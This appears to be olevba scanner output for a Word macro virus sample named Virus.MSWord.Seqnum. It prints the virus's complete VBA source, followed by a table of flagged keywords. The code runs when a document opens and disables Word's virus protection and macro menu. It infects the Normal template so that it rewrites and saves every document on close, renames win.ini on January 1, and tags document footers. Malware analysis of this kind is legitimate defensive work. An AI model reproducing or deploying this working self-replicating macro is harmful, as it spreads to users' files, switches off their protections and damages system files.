olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Seqnum
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Seqnum - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
CommandBars("Tools").Controls("Macro").Enabled = False
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
CHL = NTI1.Properties.Item("ConsecutiveHyphensLimit").Value
If CHL > 800 Then
If ((CHL / 1000 + (CHL / 10 Mod 100)) Mod 10) = ((CHL / 100 Mod 10) + CHL Mod 10) Then GoTo Caught
Else
seqNum = 824
hnetPath = Application.Path
hnetName = hnetPath & "\" & CStr(seqNum) & ".bas"
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
ADCL = ADI1.CodeModule.CountOfLines
moduleName = ADI1.Name
Open hnetName For Output Lock Read Write As #1
firstLine = "Attribute VB_Name = " & """" & moduleName & """"
Print #1, firstLine
I = 1
Do While ADI1.CodeModule.Lines(I, 1) <> ""
thisLine = ADI1.CodeModule.Lines(I, 1)
If thisLine = "seqNum = " & CStr(seqNum) Then
    a = Int(seqNum / 1000): b = Int(seqNum / 100) Mod 10: c = Int(seqNum / 10) Mod 10: d = seqNum Mod 10
    e = (a + b) Mod 10: f = (b + c) Mod 10: g = (c + d) Mod 10: h = (d + a) Mod 10
    newSeq = e * 1000 + f * 100 + g * 10 + h
    Print #1, "seqNum = " & CStr(newSeq)
Else
    Print #1, thisLine
End If
I = I + 1
Loop
Close #1
NTI1.Properties.Item("ConsecutiveHyphensLimit").Value = seqNum
NTCL = NTI1.CodeModule.CountOfLines
If NTCL > 0 Then NTI1.CodeModule.DeleteLines 1, NTCL
NTI1.CodeModule.InsertLines 1, "Private Sub Document_Close()"
NTI1.CodeModule.InsertLines 2, "Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)"
NTI1.CodeModule.InsertLines 3, "ADCL = ADI1.CodeModule.CountOfLines"
NTI1.CodeModule.InsertLines 4, "If ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL"
NTI1.CodeModule.InsertLines 5, "ADI1.CodeModule.AddFromFile (" & """" & hnetName & """" & ")"
NTI1.CodeModule.InsertLines 6, "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName"
NTI1.CodeModule.InsertLines 7, "ActiveDocument.Saved = True"
NTI1.CodeModule.InsertLines 8, "End Sub"
End If
Caught:
If Month(Now) = 1 And Day(Date) = 1 Then
With Application.FileSearch
    .NewSearch
    .LookIn = "C:\"
    .SearchSubFolders = True
    .FileName = "win.ini"
    .MatchTextExactly = True
    If .Execute > 0 Then
    oldName = .FoundFiles(1)
    Name oldName As hnetPath & "\" & CStr(seqNum)
    End If
End With
End If
If WeekDay(Date) = 3 Then
addNum = NTI1.Properties.Item("ConsecutiveHyphensLimit").Value
With ActiveDocument.Sections(1)
    .Footers(wdHeaderFooterPrimary).Range.Text = .Footers(wdHeaderFooterPrimary).Range.Text & CStr(addNum) & "@hnet.pen"
End With
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

